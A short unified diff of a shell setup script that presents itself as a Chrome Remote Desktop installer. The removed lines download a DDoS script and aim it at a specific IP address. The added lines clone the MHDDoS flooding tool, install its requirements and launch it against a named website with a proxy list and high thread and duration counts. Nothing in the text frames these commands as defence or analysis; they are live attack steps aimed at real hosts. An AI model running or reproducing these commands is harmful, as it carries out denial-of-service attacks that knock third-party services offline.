@@ -76,7 +76,8 @@ printf "\n$g$b    Installing Chrome Remote Desktop $endc$enda" >&2
 printf "\r$c$b    Chrome Remote Desktop Installed $endc$enda\n" >&2 ||
 { printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }
 
-! apt install python2
-! wget https://raw.githubusercontent.com/MrTamfanX/MCIDDOS/master/TamfanDdos.py
-! chmod +x TamfanDdos.py
-! python2 TamfanDdos.py 172.67.180.90 80 1000000
+! git clone https://github.com/MHProDev/MHDDoS.git
+! cd MHDDoS
+! pip3 install -r requirements.txt
+! python3 start.py
+! python3 start.py ovh https://beta.welovecloudflare.de 1 100000000 proxy.txt 1000 8585
